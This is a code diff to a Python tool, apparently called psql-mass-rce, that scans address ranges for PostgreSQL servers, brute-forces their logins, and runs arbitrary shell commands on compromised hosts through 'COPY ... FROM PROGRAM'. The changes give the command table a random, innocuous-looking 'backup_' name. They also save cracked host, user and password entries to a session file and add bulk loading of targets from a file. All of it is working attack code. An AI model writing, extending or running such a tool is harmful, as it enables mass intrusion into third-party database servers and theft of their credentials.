@@ -4,6 +4,8 @@ import argparse
 import psycopg2
 import re
 from netaddr import *
+import uuid
+
 
 class Victim:
     def __init__(self, ip, port, username=None, password=None):
@@ -67,10 +69,11 @@ class Victim:
 
 
     def do_rce_v9_v10(self, command):
-        make_query(self.ip, self.port, self.username, self.password, "CREATE TABLE IF NOT EXISTS debugger (id text);")
-        make_query(self.ip, self.port, self.username, self.password, "COPY debugger from program '" + command + "';")
-        command_result = make_query(self.ip, self.port, self.username, self.password, "SELECT id FROM debugger;")
-        make_query(self.ip, self.port, self.username, self.password, "DROP TABLE debugger;")
+        random_string = "backup_" + uuid.uuid4().hex[:10] # Table name cannot begin with a number
+        make_query(self.ip, self.port, self.username, self.password, "CREATE TABLE IF NOT EXISTS " + random_string + " (id text);")
+        make_query(self.ip, self.port, self.username, self.password, "COPY " + random_string + " from program '" + command + "';")
+        command_result = make_query(self.ip, self.port, self.username, self.password, "SELECT id FROM " + random_string + ";")
+        make_query(self.ip, self.port, self.username, self.password, "DROP TABLE " + random_string + ";")
         return command_result['message']
 
 
@@ -78,14 +81,33 @@ class Victim:
         return 'RCE v8 is not implemented yet'
 
 
-    def save_victim(self):
-        # We cannot use r+ because file may not exist before first run. We cannot use w+ because it deletes the file.
-        f = open('.psql-mass-rce.saved', 'a+')
-        f.seek(0) # goto first position of the file to search if victim is already in the file
-        host_port = self.ip + ":" + str(self.port)
-        if host_port not in f.read():
-            f.write(host_port + ":" + self.username + ":" + self.password + "\n")
+
+class Session:
+    def __init__(self, filename):
+        self.filename = filename
+        self.good_targets = self.load_session_file()
+
+
+    def load_session_file(self):
+        try:
+            with open(self.filename) as f:
+                lines = f.read().splitlines()
+            return lines
+        except:
+            return ['']
+
+
+    def save_victim(self, victim):
+        host_port = victim.ip + ":" + str(victim.port)
+        for line in self.good_targets:
+            if host_port in line:
+                return
+
+        f = open(self.filename, 'a+')
+        f.write(host_port + ":" + victim.username + ":" + victim.password + "\n")
         f.close()
+        self.good_targets.append(host_port)
+
 
 
 # Make PSQL query with psycopg2
@@ -156,24 +178,13 @@ def parse_target(target, port):
         exit()
 
 
-def attack_victim(ip, port, userlist, passlist, command):
+def attack_victim(ip, port, userlist, passlist, command, session):
     print("[x] Starting host " + ip + ":" + str(port))
     victim = Victim(ip, port)
     if victim.port_is_open():
         if victim.bruteforce(userlist, passlist):
-            victim.save_victim()
+            session.save_victim(victim)
             victim.do_rce(command)
-
-
-# TODO: Move load_session_file and save_session_file to new class State
-# We will read file only once, compare good hosts in memory, and save session when necessary
-def load_save_file():
-    try:
-        with open('.psql-mass-rce.saved') as f:
-            lines = f.read().splitlines()
-        return lines
-    except:
-        return []
 
 
 # Parse CLI arguments
@@ -188,6 +199,8 @@ def parse_args():
                         default=None, help='Command to execute on a target machine')
     parser.add_argument('--port', dest='port',
                         default=None, help='Port to connect')
+    parser.add_argument('-iL', dest='il_targets_file',
+                        default=None, help='Load IP[:port] targets from local file')
     parser.add_argument('--saved', dest='saved', action='store_true',
                         default=False, help='Load data from saved session file')
 
@@ -201,6 +214,7 @@ def parse_args():
             userfile_lines.append(line.strip())
     except:
         userfile_lines = ['postgres']
+
     try:
         for line in list(open(args.passfile)):
             passfile_lines.append(line.strip())
@@ -219,14 +233,30 @@ def main():
     args = parse_args()
     command = args.command
 
+    session = Session('.psql-mass-rce.saved')
+
     if args.saved:
-        for line in load_save_file():
-            data = line.split(':')
-            attack_victim(data[0], data[1], [data[2]], [data[3]], command)
+        for line in session.good_targets:
+            data = line.strip().split(':')
+            attack_victim(data[0], data[1], [data[2]], [data[3]], command, session)
+
+    elif args.il_targets_file:
+        for line in open(args.il_targets_file):
+            data = line.strip().split(':')
+            try:
+                _port = data[1]
+            except:
+                _port = args.port
+
+            for ip, port in parse_target(data[0], _port):
+                attack_victim(ip, port, args.userfile, args.passfile, command, session)
+
     else:
         for target in args.targets:
             for ip, port in parse_target(target, args.port):
-                attack_victim(ip, port, args.userfile, args.passfile, command)
+                attack_victim(ip, port, args.userfile, args.passfile, command, session)
+
 
 if __name__ == '__main__':
     main()
+
